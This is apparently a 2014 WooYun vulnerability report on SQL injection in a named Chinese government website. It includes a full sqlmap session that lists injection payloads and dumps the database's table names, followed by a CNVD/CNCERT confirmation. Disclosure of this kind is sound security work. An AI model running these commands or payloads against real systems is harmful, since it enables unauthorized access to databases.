wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2014-07-05：	细节已通知厂商并且等待厂商处理中									2014-07-09：	厂商已经确认，细节仅向厂商公开									2014-07-19：	细节向核心白帽子及相关领域专家公开									2014-07-29：	细节向普通白帽子公开									2014-08-08：	细节向实习白帽子公开									2014-08-19：	细节向公众公开  简要描述： 存在SQL注入 详细说明：  网站:http://www.gzzb.gov.cn/注入点:http://www.gzzb.gov.cn/NewsList.aspx?InfoType=工作动态
[root@Hacker~]# Sqlmap -u http://www.gzzb.gov.cn/NewsList.aspx?InfoType=工作动态 -D GzGbSystem --tables    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 10:16:33[10:16:33] [INFO] resuming back-end DBMS 'microsoft sql server'[10:16:33] [INFO] testing connection to the target url[10:16:34] [WARNING] cannot properly display Unicode characters inside Windows OS command prompt (http://bugs.python.org/issue1602). All unhandled occurances will result in replacement with '?' character. Please, find proper character representation inside corresponding output files.sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: InfoType    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: InfoType=????' AND 4424=4424 AND 'LCho'='LCho    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: InfoType=????' AND 6286=CONVERT(INT,(CHAR(58)+CHAR(116)+CHAR(101)+CHAR(111)+CHAR(58)+(SELECT (CASE WHEN (6286=6286) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(114)+CHAR(117)+CHAR(120)+CHAR(58))) AND 'mUdl'='mUdl    Type: UNION query    Title: Generic UNION query (NULL) - 25 columns    Payload: InfoType=????' UNION ALL SELECT CHAR(58)+CHAR(116)+CHAR(101)+CHAR(111)+CHAR(58)+CHAR(103)+CHAR(118)+CHAR(113)+CHAR(78)+CHAR(100)+CHAR(110)+CHAR(87)+CHAR(97)+CHAR(122)+CHAR(84)+CHAR(58)+CHAR(114)+CHAR(117)+CHAR(120)+CHAR(58), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: InfoType=????'; WAITFOR DELAY '0:0:5';--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: InfoType=????' WAITFOR DELAY '0:0:5'-----[10:16:34] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows Vistaweb application technology: ASP.NET 4.0.30319, ASP.NET, Microsoft IIS 7.0back-end DBMS: Microsoft SQL Server 2008[10:16:34] [INFO] fetching tables for database: GzGbSystem[10:16:35] [INFO] the SQL query used returns 34 entries[10:16:35] [INFO] retrieved: "dbo.aspnet_Applications"[10:16:36] [INFO] retrieved: "dbo.aspnet_Membership"[10:16:37] [INFO] retrieved: "dbo.aspnet_Paths"[10:16:37] [INFO] retrieved: "dbo.aspnet_PersonalizationAllUsers"[10:16:38] [INFO] retrieved: "dbo.aspnet_PersonalizationPerUser"[10:16:38] [INFO] retrieved: "dbo.aspnet_Profile"[10:16:39] [INFO] retrieved: "dbo.aspnet_Roles"[10:16:39] [INFO] retrieved: "dbo.aspnet_SchemaVersions"[10:16:40] [INFO] retrieved: "dbo.aspnet_UserLog"Database: GzGbSystem[9 tables]+------------------------------------+| dbo.aspnet_Applications            || dbo.aspnet_Membership              || dbo.aspnet_Paths                   || dbo.aspnet_PersonalizationAllUsers || dbo.aspnet_PersonalizationPerUser  || dbo.aspnet_Profile                 || dbo.aspnet_Roles                   || dbo.aspnet_SchemaVersions          || dbo.aspnet_UserLog                 |+------------------------------------+[10:23:11] [WARNING] HTTP error codes detected during testing:500 (Internal Server Error) - 35 times[10:23:11] [INFO] fetched data logged to text files under 'E:\tools\????\SQLMAP~3\Bin\output\www.gzzb.gov.cn'[*] shutting down at 10:23:11

wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2014-07-09 22:00 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT下发给贵州分中心处置。 最新状态： 暂无
